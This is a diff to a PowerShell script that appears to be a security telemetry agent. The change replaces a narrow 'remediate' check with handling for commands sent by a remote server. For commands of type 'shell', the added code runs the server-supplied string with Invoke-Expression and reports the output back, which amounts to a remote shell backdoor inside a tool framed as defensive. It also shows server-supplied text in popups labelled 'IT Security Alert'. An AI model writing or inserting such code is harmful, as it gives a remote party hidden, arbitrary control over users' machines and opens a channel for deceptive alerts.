@@ -82,8 +82,31 @@ function Send-Telemetry {
 
         $Response = Invoke-RestMethod -Uri "$HostURL/api/security/report" -Method Post -Body $Payload -ContentType "application/json"
         
-        if ($Response.command -eq "remediate") {
-            Invoke-Remediation
+        if ($Response.command) {
+            $Cmd = $Response.command
+            Write-Log "Remote Command Received: $($Cmd | ConvertTo-Json -Compress)"
+            
+            # 1. Handle Object-based Commands (New v3.0 logic)
+            if ($Cmd.type -eq "shell") {
+                $Code = $Cmd.payload.command
+                Send-Progress "Executing Remote Shell: $Code"
+                try {
+                    $ExecResult = Invoke-Expression $Code | Out-String
+                    Send-Progress "Result: $ExecResult"
+                } catch { Send-Progress "Error: $($_.Exception.Message)" }
+            }
+            # 2. Handle SCAN_DEVICE or legacy remediate
+            elseif ($Cmd.type -eq "SCAN_DEVICE" -or $Cmd -eq "remediate" -or $Cmd.type -eq "remediate") {
+                Invoke-Remediation
+            }
+            # 3. Handle Message Popups
+            elseif ($Cmd.type -eq "Message") {
+                $Text = $Cmd.payload.text
+                Send-Progress "Displaying message to user: $Text"
+                Add-Type -AssemblyName PresentationFramework
+                [System.Windows.MessageBox]::Show($Text, "IT Security Alert")
+            }
+            
             Send-Telemetry 
         } else {
             Write-Log "Standby: No pending remote commands." "SUCCESS"
